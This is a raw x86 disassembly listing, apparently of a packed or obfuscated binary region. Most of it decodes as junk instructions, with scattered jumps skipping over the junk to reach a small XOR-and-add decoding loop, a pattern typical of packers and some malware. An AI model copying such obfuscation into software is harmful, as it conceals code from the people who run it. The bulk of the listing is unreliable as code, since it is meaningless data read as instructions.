  406a37:	je     0x406a8f
  406a39:	lea    esp,[ebx]
  406a3b:	scas   eax,DWORD PTR es:[edi]
  406a3c:	sti    
  406a3d:	(bad)  
  406a3e:	push   edi
  406a3f:	stos   BYTE PTR es:[edi],al
  406a40:	xor    eax,0xbea4bf63
  406a45:	inc    eax
  406a46:	fiadd  DWORD PTR [edi+esi*1+0xbb0000]
  406a4d:	add    BYTE PTR [eax],al
  406a4f:	jae    0x406a65
  406a51:	test   al,0x37
  406a53:	jne    0x406aa1
  406a55:	mov    ebp,0xb167f3fc
  406a5a:	mov    dh,0x40
  406a5c:	popf   
  406a5d:	sub    esi,eax
  406a5f:	dec    ebp
  406a60:	xchg   ebx,eax
  406a61:	xchg   esi,eax
  406a62:	nop
  406a63:	das    
  406a64:	add    BYTE PTR [edi-0x3c2e3df6],cl
  406a6a:	daa    
  406a6b:	add    al,0x0
  406a6d:	lods   eax,DWORD PTR ds:[esi]
  406a6e:	imul   DWORD PTR [eax-0x1e77f763]
  406a74:	sahf   
  406a75:	sti    
  406a76:	leave  
  406a77:	mov    edi,0x5210a252
  406a7c:	fwait
  406a7d:	mov    eax,0x1b4058cd
  406a82:	mov    esp,0xa4e0932e
  406a87:	jmp    0x8cdb426c
  406a8c:	mov    ebx,0x5f5b321
  406a91:	xchg   esi,eax
  406a92:	fldenv cs:[ebp+ebp*4-0x16]
  406a97:	mov    al,ds:0x34947776
  406a9c:	cmp    eax,0x6ac8d9cf
  406aa1:	pop    ds
  406aa2:	sbb    dl,BYTE PTR [esi-0x7c]
  406aa5:	into   
  406aa6:	and    dl,BYTE PTR [esi+0x40]
  406aa9:	std    
  406aaa:	sahf   
  406aab:	and    eax,0xfb157862
  406ab0:	or     eax,0xa116decc
  406ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab6:	pusha  
  406ab7:	xchg   BYTE PTR [ebx],ch
  406ab9:	in     eax,dx
  406aba:	mov    dh,BYTE PTR [esi+0x7c]
  406abd:	pop    edx
  406abe:	mov    dh,0x79
  406ac0:	cmp    al,0xbe
  406ac2:	mov    bl,0xdd
  406ac4:	out    0x71,al
  406ac6:	bound  edx,QWORD PTR ds:0x63c734f6
  406acc:	push   ecx
  406acd:	mov    esi,0x92b133e3
  406ad2:	(bad)  
  406ad3:	pop    ebp
  406ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ad5:	xor    edi,ebp
  406ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ad8:	js     0x406aca
  406ada:	jns    0x406a77
  406adc:	enter  0x7456,0x94
  406ae0:	ret    0xf1c9
  406ae3:	(bad)  
  406ae4:	sub    esp,DWORD PTR [ebx+edi*8-0x12]
  406ae8:	jle    0x406adc
  406aea:	cmp    eax,0xb15a2e66
  406aef:	fcomp  DWORD PTR [eax+0x3cb7116b]
  406af5:	pop    edx
  406af6:	xchg   ebx,eax
  406af7:	jge    0x406b3f
  406af9:	xor    esi,DWORD PTR [edi+0x1a294ce3]
  406aff:	es jmp 0xa170:0x71867524
  406b07:	inc    edx
  406b08:	sub    DWORD PTR [edi-0x75],esi
  406b0b:	push   ebp
  406b0c:	cld    
  406b0d:	xor    eax,esi
  406b0f:	mov    DWORD PTR [ebp+0x10],eax
  406b12:	add    eax,0x99b8624c
  406b17:	jmp    0x406bef
  406b1c:	dec    esp
  406b1d:	xor    eax,0xbffbb3ba
  406b22:	dec    ebp
  406b23:	dec    esp
  406b25:	stos   BYTE PTR es:[edi],al
  406b26:	jmp    0x406b44
  406b28:	enter  0x2d44,0xa4
  406b2c:	aas    
  406b2d:	cmp    BYTE PTR [eax],al
  406b2f:	add    BYTE PTR [ebx+0x7a000000],bh
  406b35:	pushw  ds
  406b37:	jmp    0x5fd2:0x675bafd6
  406b3e:	xchg   ebx,eax
  406b3f:	push   0x1ecf7ad4
  406b44:	cmp    eax,0xf6e66303
  406b49:	sub    BYTE PTR [ecx+0x46],dh
  406b4c:	or     edx,DWORD PTR [ebx+0x41dfeb33]
  406b52:	mov    esi,DWORD PTR [edx-0x11]
  406b55:	aas    
  406b56:	push   0xa7f02f12
  406b5b:	and    al,0x47
  406b5d:	scas   eax,DWORD PTR es:[edi]
  406b5e:	cmp    BYTE PTR [esi+0x74],bh
  406b61:	jb     0x406b8d
  406b63:	inc    edx
  406b64:	adc    edx,DWORD PTR [ebp+0xaf813de]
  406b6a:	xlat   BYTE PTR ds:[ebx]
  406b6b:	fisttp DWORD PTR [ebx]
  406b6d:	(bad)  
  406b6e:	fisubr DWORD PTR ds:0x903442ca
  406b74:	inc    edx
  406b75:	ss das 
  406b77:	cmp    BYTE PTR [ecx-0x7241370e],dl
  406b7d:	cmc    
  406b7e:	add    BYTE PTR [edx+0x13],al
  406b81:	std    
  406b82:	retf   
  406b83:	shl    BYTE PTR es:[edx-0x4c9f8523],1
  406b8a:	popf   
  406b8b:	inc    eax
  406b8c:	mov    esi,0xcb6d34a2
  406b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b92:	xor    DWORD PTR [ebp-0x41],eax
  406b95:	sbb    al,0x9c
  406b97:	(bad)  
  406b98:	jae    0x406c19
  406b9a:	pop    eax
  406b9b:	lea    edi,[eax+0x4c]
  406b9e:	dec    edx
  406b9f:	dec    esp
  406ba0:	ret    0xbd18
  406ba3:	or     bl,BYTE PTR ss:[ebx+0x5177dac6]
  406baa:	ss xor ebx,ebx
  406bad:	dec    ecx
  406bae:	arpl   WORD PTR [edi+0x1e],cx
  406bb1:	mov    eax,ds:0x7f7809e0
  406bb6:	dec    esi
  406bb8:	dec    ecx
  406bb9:	cmp    eax,0xc674139d
  406bbe:	push   eax
  406bbf:	imul   eax,DWORD PTR [ebx+0xdbe3c2d],0xffffffa3
  406bc6:	sub    DWORD PTR [edi],ebx
  406bc8:	jl     0x406c2c
  406bca:	mov    bh,0xb3
  406bcc:	xchg   DWORD PTR [esi],ebp
  406bce:	push   esp
  406bcf:	out    0x52,al
  406bd1:	pop    esp
  406bd2:	ss int 0xbc
  406bd5:	pop    ebx
  406bd6:	ret    
  406bd7:	xchg   edx,eax
  406bd8:	aas    
  406bd9:	push   ss
  406bda:	cmc    
  406bdb:	iret   
  406bdc:	test   BYTE PTR [eax],dh
  406bde:	xor    BYTE PTR [edi+0x77],0x89
  406be2:	jle    0x406bd5
  406be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406be5:	cld    
  406be6:	cmp    DWORD PTR [ecx],ecx
  406be8:	test   al,0x42
  406bea:	cmp    BYTE PTR [ebp-0x82ef894],dh
  406bf0:	shl    BYTE PTR [ebx],1
  406bf2:	ret    0xd3e9
  406bf5:	add    BYTE PTR [eax],al
  406bf7:	add    dh,bh
  406bf9:	push   ebp
  406bfa:	mov    ch,0x24
  406bfc:	mov    edi,0x9bdfffe4
  406c01:	leave  
  406c02:	sub    edi,DWORD PTR [ebx-0x5a62bb1e]
  406c08:	cli    
  406c09:	cmp    BYTE PTR [eax],al
  406c0b:	add    BYTE PTR [ebx+0x56000000],bh
  406c11:	pop    esp
  406c12:	or     cl,BYTE PTR [eax]
  406c14:	xlat   BYTE PTR ds:[ebx]
  406c15:	xchg   BYTE PTR [edi],dh
  406c17:	pop    ebp
  406c18:	mov    ebx,0xec44b379
  406c1d:	fistp  QWORD PTR [edi]
  406c1f:	and    DWORD PTR [ebp-0x68b5a30c],eax
  406c25:	push   eax
  406c26:	pop    es
  406c27:	xor    esi,ebx
  406c29:	push   ebp
  406c2a:	ret    
  406c2b:	mov    al,0xa7
  406c2d:	shl    BYTE PTR [ecx+ebp*1],cl
  406c30:	xchg   DWORD PTR [ecx+0xa0d060c],esp
  406c36:	pop    ecx
  406c37:	shl    DWORD PTR [esi-0x9],0x5b
  406c3b:	mov    BYTE PTR [ebx+ecx*2+0x33a68747],ah
  406c42:	aaa    
  406c43:	push   es
  406c44:	or     al,0x28
  406c46:	mov    ebp,0xe0f5d997
  406c4b:	and    eax,0x837a4e39
  406c50:	mov    bh,0xf9
  406c52:	or     BYTE PTR [eax+0x698bbf04],al
  406c58:	popf   
  406c59:	in     al,dx
  406c5a:	or     bl,bl
  406c5c:	xor    DWORD PTR ds:0x24639e,eax
  406c62:	push   eax
  406c63:	add    dh,BYTE PTR [eax+0x1df208dc]
  406c69:	out    dx,eax
  406c6a:	std    
  406c6b:	dec    edx
  406c6c:	push   ebx
  406c6d:	xchg   esp,eax
  406c6e:	inc    edx
  406c6f:	cmc    
  406c70:	add    eax,0xd6fd6710
  406c75:	xchg   esi,eax
  406c76:	sahf   
  406c77:	inc    edi
  406c78:	(bad)  [edx]
  406c7a:	push   ds
  406c7b:	dec    ebp
  406c7c:	iret   
  406c7d:	(bad)  
  406c7e:	fst    DWORD PTR [edi+0x4f22ddb1]
  406c84:	mov    ebp,0xe05ccf5
  406c89:	test   eax,0xdb65a586
  406c8e:	sub    DWORD PTR [edi+0x72],0x59
  406c92:	mov    cl,0x31
  406c94:	sub    eax,0xcebba2ee
  406c99:	jmp    0x406ca1
  406c9b:	sub    al,0x63
  406c9d:	arpl   WORD PTR [eax+0x5b63b6db],si
  406ca3:	ins    BYTE PTR es:[edi],dx
  406ca4:	das    
  406ca5:	cld    
  406ca6:	inc    edx
  406ca7:	fld    DWORD PTR [ebx+0x1b]
  406caa:	lock mov eax,ds:0x5be8b6a5
  406cb0:	std    
  406cb1:	out    0x84,eax
  406cb3:	sub    eax,0xab7f49e4
  406cb8:	pop    ecx
  406cb9:	call   0x151f5fc6
  406cbe:	aas    
  406cbf:	or     al,0xfa
  406cc1:	test   DWORD PTR ds:0x586fc0a6,edx
  406cc7:	pop    esp
  406cc8:	cli    
  406cc9:	aam    0xed
  406ccb:	mov    DWORD PTR [ebp-0x4],eax
  406cce:	mov    eax,DWORD PTR [ebp-0x40]
  406cd1:	jmp    0x406da9
  406cd6:	pop    ecx
  406cd7:	xor    eax,0xdfee0be2
  406cdc:	stc    
  406cdd:	ja     0x406d46
  406cdf:	(bad)  
  406ce1:	aas    
  406ce2:	xor    al,0x9d
  406ce4:	xor    ah,cl
  406ce6:	mov    ch,0x39
  406ce8:	add    BYTE PTR [eax],al
  406cea:	mov    ebx,0x1b000000
  406cef:	sbb    ecx,DWORD PTR [ecx-0x2bab99fc]
  406cf5:	and    al,0x3b
  406cf7:	pop    ds
  406cf8:	or     eax,0xe77ecdc6
  406cfd:	js     0x406d29
  406cff:	xchg   BYTE PTR [eax+ecx*2],dh
  406d02:	or     DWORD PTR [ecx],0x3e38dfc3
  406d08:	adc    eax,0x20656767
  406d0d:	push   ebx
  406d0e:	ror    BYTE PTR [ecx],1
  406d10:	maskmovq mm5,(bad)
  406d11:	imul   DWORD PTR [edx-0x63]
  406d14:	popf   
  406d15:	sub    cl,BYTE PTR [ecx]
  406d17:	adc    bh,bl
  406d19:	sti    
  406d1a:	fist   DWORD PTR [ecx+0x60]
  406d1d:	iret   
  406d1e:	out    0x48,al
  406d20:	(bad)  
  406d21:	scas   eax,DWORD PTR es:[edi]
  406d22:	jecxz  0x406ce6
  406d24:	push   edx
  406d25:	popf   
  406d26:	daa    
  406d27:	cmp    BYTE PTR [eax],ch
  406d29:	pop    ebp
  406d2a:	out    dx,eax
  406d2b:	inc    ecx
  406d2c:	xor    eax,0x4b890aab
  406d31:	popa   
  406d32:	inc    ebp
  406d33:	shl    edx,0xbb
  406d36:	test   bh,bl
  406d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d39:	mov    eax,DWORD PTR [ecx]
  406d3b:	dec    esi
  406d3c:	mov    edx,0x97f19155
  406d41:	jecxz  0x406cc6
  406d43:	xlat   BYTE PTR ds:[ebx]
  406d44:	imul   ebp,DWORD PTR [ebx],0x48e7c292
  406d4a:	scas   al,BYTE PTR es:[edi]
  406d4b:	out    dx,al
  406d4c:	inc    edi
  406d4d:	mov    ebp,0x43af5e25
  406d52:	icebp  
  406d53:	mov    ah,0xbc
  406d55:	pop    esp
  406d56:	out    dx,eax
  406d57:	mov    ebp,0xc3e629f0
  406d5c:	fst    QWORD PTR [ebp-0x2bdbbcb7]
  406d62:	sub    BYTE PTR [ecx+edi*8+0x37],dh
  406d66:	popf   
  406d67:	stos   BYTE PTR es:[edi],al
  406d68:	xor    edx,DWORD PTR [ecx]
  406d6a:	mov    dl,BYTE PTR [ebx+0x4a3f8876]
  406d70:	in     eax,0x20
  406d72:	outs   dx,DWORD PTR ds:[esi]
  406d73:	nop
  406d74:	in     eax,dx
  406d75:	dec    ecx
  406d76:	popf   
  406d77:	push   ss
  406d78:	les    esi,FWORD PTR [eax]
  406d7a:	out    dx,al
  406d7b:	xchg   edx,eax
  406d7c:	mov    esp,0x644d77a7
  406d81:	dec    eax
  406d82:	xor    eax,0xad314c28
  406d87:	pop    esp
  406d88:	add    al,0x29
  406d8a:	mov    ebx,0x6372a4ff
  406d8f:	or     edx,esp
  406d91:	dec    ebx
  406d92:	inc    esi
  406d93:	xchg   esp,eax
  406d94:	clc    
  406d95:	xor    al,0x57
  406d97:	test   BYTE PTR [edi-0x5d1ccb5],bh
  406d9d:	aas    
  406d9e:	inc    eax
  406d9f:	(bad)  
  406da0:	(bad)  
  406da1:	outs   dx,BYTE PTR ds:[esi]
  406da2:	sub    ch,BYTE PTR [edi-0x97627b9]
  406da8:	pop    ecx
  406da9:	mov    edx,DWORD PTR [ebp-0x3c]
  406dac:	mov    edx,0xd260
  406db1:	xor    ax,dx
  406db4:	mov    edx,0x624d
  406db9:	add    ax,dx
  406dbc:	mov    edx,DWORD PTR [ebp-0x4]
  406dbf:	cmp    WORD PTR [edx],ax
  406dc2:	je     0x407330
  406dc8:	mov    eax,0x66479db3
  406dcd:	sub    eax,DWORD PTR [ebp+0x10]
  406dd0:	jmp    0x406ea8
  406dd5:	mov    BYTE PTR [ecx-0x40cc6ace],bl
  406ddb:	scas   eax,DWORD PTR es:[edi]
  406ddc:	popf   
  406ddd:	ret    
  406dde:	sar    BYTE PTR [ebx],0xc3
  406de1:	sbb    DWORD PTR [ebx+0x3a70339b],edi
  406de7:	add    BYTE PTR [eax],al
  406de9:	mov    ebx,0xe2000000
  406dee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406def:	xor    al,0xf5
  406df1:	fdiv   QWORD PTR [esi-0x49967419]
  406df7:	daa    
  406df8:	sbb    al,0xb3
  406dfa:	nop
  406dfb:	outs   dx,DWORD PTR ds:[esi]
  406dfc:	loope  0x406e4c
  406dfe:	or     eax,0x579eacbf
  406e03:	int3   
  406e04:	pop    ebx
  406e05:	xchg   esp,eax
  406e06:	std    
  406e07:	fst    QWORD PTR [ebp-0x53]
  406e0a:	push   0xffffffb8
  406e0c:	in     eax,0xef
  406e0e:	les    eax,FWORD PTR es:[ecx-0x35c27f48]
  406e15:	jbe    0x406e96
  406e17:	fcmove st,st(4)
  406e19:	add    BYTE PTR [ecx-0x3056ab3c],al
  406e1f:	push   eax
  406e20:	sahf   
  406e21:	mov    eax,0x81d0a707
  406e26:	adc    al,bl
  406e28:	push   0x30
  406e2a:	arpl   bx,cx
  406e2c:	fstp   TBYTE PTR [ebx]
  406e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e2f:	xchg   DWORD PTR [edi+edx*1],ecx
  406e32:	push   ds
  406e33:	jle    0x406e1d
  406e35:	test   al,0x62
  406e37:	push   bp
  406e39:	enter  0xea74,0xa5
  406e3d:	fnstenvw [ebx-0x575ceb2a]
  406e44:	jmp    0xeb232721
  406e49:	jne    0x406e04
  406e4b:	adc    edi,DWORD PTR [edx+0x79]
  406e4e:	ret    0xf77e
  406e51:	bsf    esi,DWORD PTR [ebp-0x45e5b3e0]
  406e58:	nop
  406e59:	pop    DWORD PTR [edi-0x4710b1fb]
  406e5f:	pop    ss
  406e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e61:	sbb    eax,0x9a2adb14
  406e66:	inc    ebx
  406e67:	pop    ecx
  406e68:	fwait
  406e69:	sub    al,0xe2
  406e6b:	out    0x13,al
  406e6d:	pop    eax
  406e6e:	add    eax,0xbe0366e8
  406e73:	nop
  406e74:	in     eax,0xc0
  406e76:	xchg   esp,eax
  406e77:	push   esp
  406e78:	inc    ebp
  406e79:	cmc    
  406e7a:	mov    eax,ds:0x987f5b8
  406e7f:	mov    eax,0x31a417f8
  406e84:	repnz lea edx,[ecx+0x7a]
  406e88:	push   es
  406e89:	xchg   esi,eax
  406e8a:	retf   0xc657
  406e8d:	into   
  406e8e:	sbb    BYTE PTR [edx-0x1b730114],0xe4
  406e95:	retf   
  406e96:	outs   dx,DWORD PTR ds:[esi]
  406e97:	sub    DWORD PTR [edx],esi
  406e99:	(bad)  
  406e9a:	push   0x74
  406e9c:	adc    bh,BYTE PTR [ecx]
  406e9e:	adc    al,0xc5
  406ea0:	dec    BYTE PTR [ebx]
  406ea2:	xchg   BYTE PTR [esi],ah
  406ea4:	pop    ebp
  406ea5:	das    
  406ea6:	and    DWORD PTR [esi+0x3],ebx
  406ea9:	inc    ebp
  406eaa:	cld    
  406eab:	mov    DWORD PTR [ebp-0x4],eax
  406eae:	mov    eax,DWORD PTR [edi]
  406eb0:	mov    edx,DWORD PTR [edi+0x4]
  406eb3:	xor    edx,ebx
  406eb5:	xor    eax,esi
  406eb7:	jmp    0x406f8f
  406ebc:	mov    edi,0x6a086295
  406ec1:	(bad)  
  406ec2:	push   DWORD PTR [edi+0x3328aa8f]
  406ec8:	adc    dh,BYTE PTR ds:0x3b2b0d80
  406ece:	add    BYTE PTR [eax],al
  406ed0:	mov    ebx,0x6f000000
  406ed5:	xchg   edi,eax
  406ed6:	mov    bl,0x76
  406ed8:	popf   
  406ed9:	inc    ebx
  406eda:	jg     0x406e64
  406edc:	fld    QWORD PTR [edx]
  406ede:	mov    ds:0xde672308,eax
  406ee3:	dec    esp
  406ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee5:	push   0xf950789f
  406eea:	mov    edx,0x965f07ed
  406eef:	leave  
  406ef0:	lods   al,BYTE PTR ds:[esi]
  406ef1:	aaa    
  406ef2:	or     ch,BYTE PTR [ebp+0x48733742]
  406ef8:	jg     0x406ee8
  406efa:	xor    al,BYTE PTR [edi+0x3da091de]
  406f00:	mov    ebx,0x4a0f2dc
  406f05:	int3   
  406f06:	pop    ss
  406f07:	rol    DWORD PTR [eax+0x11],cl
  406f0a:	cmp    BYTE PTR [esi+edx*1+0x4b338d3a],cl
  406f11:	test   eax,0x1515ba4b
  406f16:	jbe    0x406f92
  406f18:	mov    ecx,DWORD PTR [edx+0x6d507b97]
  406f1e:	icebp  
  406f1f:	mov    esp,0xc9b694e9
  406f24:	sbb    al,bl
  406f26:	cmp    bl,BYTE PTR [edi]
  406f28:	jmp    0x406ee0
  406f2a:	sub    eax,DWORD PTR [ebx]
  406f2c:	pop    ds
  406f2d:	rcr    DWORD PTR ds:0xffd7e0fb,1
  406f33:	pusha  
  406f34:	or     al,0xc4
  406f36:	(bad)  
  406f38:	dec    eax
  406f39:	test   eax,0xfabe0fab
  406f3e:	push   eax
  406f40:	int    0x3
  406f42:	retf   0x9667
  406f45:	test   eax,0x68e4240b
  406f4a:	sub    esp,ebx
  406f4c:	push   ebx
  406f4d:	out    0xb5,eax
  406f4f:	push   0xffffffa1
  406f51:	xor    BYTE PTR [edx],bl
  406f53:	sub    BYTE PTR [ebx],dl
  406f55:	cmp    esi,ebp
  406f57:	das    
  406f58:	add    edx,DWORD PTR [ebp+0x18e9c316]
  406f5e:	jbe    0x406f7b
  406f60:	pop    esi
  406f61:	outs   dx,BYTE PTR ds:[esi]
  406f62:	and    al,0x16
  406f64:	sti    
  406f65:	sbb    DWORD PTR [ecx-0x4c0c7170],0xffffffb5
  406f6c:	test   eax,0xb2436958
  406f71:	sub    eax,0xb4e3aab7
  406f76:	pop    es
  406f77:	mov    edx,0x3f2d4ca5
  406f7c:	mov    eax,ds:0xa34988bf
  406f81:	jno    0x406fbd
  406f83:	inc    eax
  406f84:	xor    al,ah
  406f86:	mov    esp,0xc506fe7f
  406f8b:	cs jae 0x406f96
  406f8e:	pop    eax
  406f8f:	add    eax,0x99b8624d
  406f94:	jmp    0x40706c
  406f99:	popa   
  406f9a:	push   ds
  406f9b:	xchg   ebx,eax
  406f9c:	stos   BYTE PTR es:[edi],al
  406f9d:	jmp    FWORD PTR [edi-0x39be2087]
  406fa3:	shl    BYTE PTR [ebx],1
  406fa5:	xchg   DWORD PTR [edi],ebp
  406fa7:	adc    eax,0x3be6e4
  406fac:	add    BYTE PTR [ebx+0x12000000],bh
  406fb2:	push   0x56ec3948
  406fb7:	lea    ebx,[edi-0x72]
  406fba:	stc    
  406fbb:	jns    0x406fb6
  406fbd:	add    BYTE PTR [esi+edi*8],dh
  406fc0:	jge    0x406f7f
  406fc2:	jae    0x406fe8
  406fc4:	rol    eax,cl
  406fc6:	mov    WORD PTR [ebx],gs
  406fc8:	test   BYTE PTR [esi],bl
  406fca:	clc    
  406fcb:	cli    
  406fcc:	or     BYTE PTR [edi-0x62],cl
  406fcf:	shr    DWORD PTR [ecx+eiz*1+0x50],cl
  406fd3:	arpl   WORD PTR [eax-0x6b],bx
  406fd6:	aas    
  406fd7:	adc    cl,BYTE PTR [eax-0x21f8897b]
  406fdd:	mov    gs,WORD PTR [esi+0x2e]
  406fe0:	jp     0x407004
  406fe2:	fnsave [ecx]
  406fe4:	jl     0x406ff6
  406fe6:	inc    edi
  406fe7:	sub    DWORD PTR [eax-0x4be58c98],esi
  406fed:	xor    al,0xa1
  406fef:	sahf   
  406ff0:	loope  0x406f88
  406ff2:	jl     0x407064
  406ff4:	cmc    
  406ff5:	sub    ebp,DWORD PTR ds:0x9f6a20f
  406ffb:	test   cl,bh
  406ffd:	mov    eax,ds:0x31c60599
  407002:	cwde   
  407003:	or     eax,0x7c182af
  407008:	fxch   st(5)
  40700a:	cmp    eax,0xc6b110ce
  40700f:	cld    
  407010:	es jb  0x406fa8
  407013:	add    eax,0x2bb1dfb9
  407018:	mov    BYTE PTR [esi-0x25],cl
  40701b:	sub    eax,0xd08d7f0f
  407020:	iret   
  407021:	inc    esi
  407022:	dec    edx
  407023:	jecxz  0x406ff7
  407025:	(bad)  [edx+0x3]
  407028:	add    BYTE PTR [edx],dh
  40702a:	stos   DWORD PTR es:[edi],eax
  40702b:	icebp  
  40702c:	or     al,0x97
  40702e:	test   BYTE PTR [esi+0xffbab1d],dl
  407034:	pop    ss
  407035:	jbe    0x407009
  407037:	or     DWORD PTR [esi+0x2ed5488c],ebx
  40703d:	not    edx
  40703f:	mov    ds:0x493ad9f4,al
  407044:	arpl   bx,dx
  407046:	in     eax,dx
  407047:	or     dl,ch
  407049:	mov    esp,0xaacad224
  40704e:	and    DWORD PTR es:[esi-0x36],esp
  407052:	push   ebx
  407053:	jl     0x407028
  407055:	push   eax
  407056:	sahf   
  407057:	xchg   ebx,eax
  407058:	mov    al,cl
  40705a:	retf   
  40705b:	mov    BYTE PTR [edi],0x5b
  40705e:	pop    ebp
  40705f:	adc    esi,ebx
  407061:	stos   DWORD PTR es:[edi],eax
  407062:	pusha  
  407063:	xchg   ecx,eax
  407064:	lds    esp,FWORD PTR [ebp-0xde31565]
  40706a:	cmp    esp,edi
  40706c:	adc    edx,0x8ddc
  407072:	mov    DWORD PTR [ebp+0x18],eax
  407075:	mov    eax,DWORD PTR [ecx]
  407077:	jmp    0x40714f
  40707c:	mov    ds:0x6e816ec5,eax
  407081:	stos   DWORD PTR es:[edi],eax
  407082:	out    dx,eax
  407083:	out    0x7a,eax
  407085:	jmp    0x5fdb:0x99da3fa9
  40708c:	mov    eax,ds:0xbb00003c
  407091:	add    BYTE PTR [eax],al
  407093:	add    dl,ch
  407095:	cmp    eax,0x887dc8d4
  40709a:	mov    al,0x40
  40709c:	addr16 mov cl,0x90
  40709f:	sub    esp,ebx
  4070a1:	add    BYTE PTR [ebp-0x7e],dh
  4070a4:	mov    al,ds:0xef8e2cc0
  4070a9:	scas   al,BYTE PTR es:[edi]
  4070aa:	repz icebp 
  4070ac:	in     al,dx
  4070ad:	xchg   ebx,eax
  4070ae:	(bad)  
  4070b0:	adc    al,0xa6
  4070b2:	mov    eax,ds:0xf499465a
  4070b7:	(bad)  
  4070b8:	hlt    
  4070b9:	cmp    eax,0xb8fb742
  4070be:	sahf   
  4070bf:	mov    ds:0xc462786d,eax
  4070c4:	sub    al,0x1b
  4070c6:	repnz push ecx
  4070c8:	in     eax,0xb3
  4070ca:	clc    
  4070cb:	test   eax,0x54d6e031
  4070d0:	dec    esi
  4070d1:	sbb    cl,ah
  4070d3:	imul   edx,DWORD PTR [esi+0x59],0x8ec65d8a
  4070da:	and    eax,0x66070346
  4070df:	bswap  esi
  4070e1:	cmp    DWORD PTR [edx-0x5dc3d5b2],0x19
  4070e8:	push   ebp
  4070e9:	push   esi
  4070ea:	push   edi
  4070eb:	pop    es
  4070ec:	dec    ecx
  4070ed:	les    ebx,FWORD PTR [eax-0x5e3ddbd5]
  4070f3:	in     eax,0xde
  4070f5:	adc    eax,edx
  4070f7:	xor    BYTE PTR [edi],cl
  4070f9:	mov    ds:0xcf8932f4,al
  4070fe:	cs dec ecx
  407100:	ss pop esp
  407102:	pop    eax
  407103:	dec    esp
  407104:	in     al,dx
  407105:	sbb    al,BYTE PTR [esi-0x7c]
  407108:	push   0xffffff8f
  40710a:	out    dx,al
  40710b:	(bad)  
  40710c:	scas   al,BYTE PTR es:[edi]
  40710d:	fwait
  40710e:	inc    BYTE PTR [edx]
  407110:	cmp    esi,ecx
  407112:	xchg   edi,eax
  407113:	retf   0xa359
  407116:	pop    es
  407117:	cwde   
  407118:	int    0x78
  40711a:	mov    eax,ds:0xf4ecd1fb
  40711f:	add    esp,ebp
  407121:	cwde   
  407122:	xor    al,0x1f
  407124:	or     DWORD PTR [esi],0x727f2920
  40712a:	pop    ss
  40712b:	shl    BYTE PTR ds:0x474aa9b1,0x57
  407133:	daa    
  407134:	ins    BYTE PTR es:[edi],dx
  407135:	repnz out 0x18,eax
  407138:	mov    ecx,0x1f96c92
  40713d:	nop
  40713e:	inc    esp
  40713f:	int3   
  407140:	je     0x407167
  407142:	scas   eax,DWORD PTR es:[edi]
  407143:	rcl    bl,cl
  407145:	xchg   DWORD PTR [esi+0x7c],edi
  407148:	xor    DWORD PTR [ecx+0x6b81f6a2],edi
  40714e:	(bad)  
  40714f:	mov    DWORD PTR [ebp+0x1c],edx
  407152:	mov    edx,DWORD PTR [ecx+0x4]
  407155:	xor    eax,esi
  407157:	xor    edx,ebx
  407159:	add    eax,0x99b8624d
  40715e:	adc    edx,0x8ddc
  407164:	mov    DWORD PTR [ebp-0x5c],edx
  407167:	cmp    DWORD PTR [ebp+0x18],eax
  40716a:	jne    0x406cce
  407170:	jmp    0x407248
  407175:	ret    0x94f
  407178:	sti    
  407179:	(bad)  
  40717a:	push   edx
  40717c:	jg     0x40716c
  40717e:	xor    eax,esp
  407180:	or     eax,0x65a4cc6d
  407185:	pop    esp
  407186:	cmp    eax,0xbb0000
  40718b:	add    BYTE PTR [eax],al
  40718d:	mov    esi,0xbb32a3ce
  407192:	sbb    al,bh
  407194:	data16 es fxch st(5)
  407198:	(bad)  [ebp+0x70]
  40719b:	adc    ebp,ebx
  40719d:	sub    ch,BYTE PTR [ecx+0x46]
  4071a0:	cld    
  4071a1:	imul   edi,DWORD PTR [edi-0x5e],0x942a4b5c
  4071a8:	inc    edi
  4071a9:	sub    dl,ch
  4071ab:	push   esp
  4071ac:	bound  edx,QWORD PTR [ecx*1-0x15fecca7]
  4071b3:	call   0x8fc3:0xe206120
  4071ba:	xchg   ebx,eax
  4071bb:	push   es
  4071bc:	adc    BYTE PTR [ebx],ch
  4071be:	mov    BYTE PTR [esi],al
  4071c0:	retf   0xf863
  4071c3:	dec    ebp
  4071c4:	and    eax,0x6a086834
  4071c9:	cmp    DWORD PTR [edx-0x5b87d090],esi
  4071cf:	ins    BYTE PTR es:[edi],dx
  4071d0:	inc    esi
  4071d1:	pusha  
  4071d2:	fnstcw WORD PTR [edx+0x6b40a2fa]
  4071d8:	add    DWORD PTR [ebp+0xe02c389],eax
  4071de:	jnp    0x407232
  4071e0:	sbb    esi,esi
  4071e2:	pusha  
  4071e3:	cli    
  4071e4:	cli    
  4071e5:	xchg   ebx,eax
  4071e6:	test   eax,0xad205d4
  4071eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ec:	mov    ah,0x47
  4071ee:	(bad)  
  4071ef:	xlat   BYTE PTR ds:[ebx]
  4071f0:	push   es
  4071f1:	fmulp  st(0),st
  4071f3:	sub    BYTE PTR [eax-0x71],bl
  4071f6:	loop   0x4071d0
  4071f8:	and    edx,ebx
  4071fa:	into   
  4071fb:	or     al,0x62
  4071fd:	sub    esp,0xfc3912b4
  407203:	(bad)  
  407205:	add    DWORD PTR [eax-0xb],ecx
  407208:	pusha  
  407209:	adc    dl,BYTE PTR [ebx+0x1e115f0f]
  40720f:	das    
  407210:	lods   eax,DWORD PTR ds:[esi]
  407211:	add    ch,BYTE PTR [ecx+0x3701e301]
  407217:	out    0xf3,eax
  407219:	sbb    eax,0x11bea780
  40721e:	push   0x8247a395
  407223:	mov    edx,0x80a9ba84
  407228:	pop    edi
  407229:	clc    
  40722a:	pop    esp
  40722b:	shl    DWORD PTR [ebp-0x1948b189],1
  407231:	mov    cl,0xd1
  407233:	std    
  407234:	daa    
  407235:	in     eax,dx
  407236:	and    BYTE PTR ds:0x6483b3b6,bh
  40723c:	cdq    
  40723d:	shr    bh,1
  40723f:	adc    DWORD PTR [eax-0x4b],esp
  407242:	mov    ecx,0x62d2ee2c
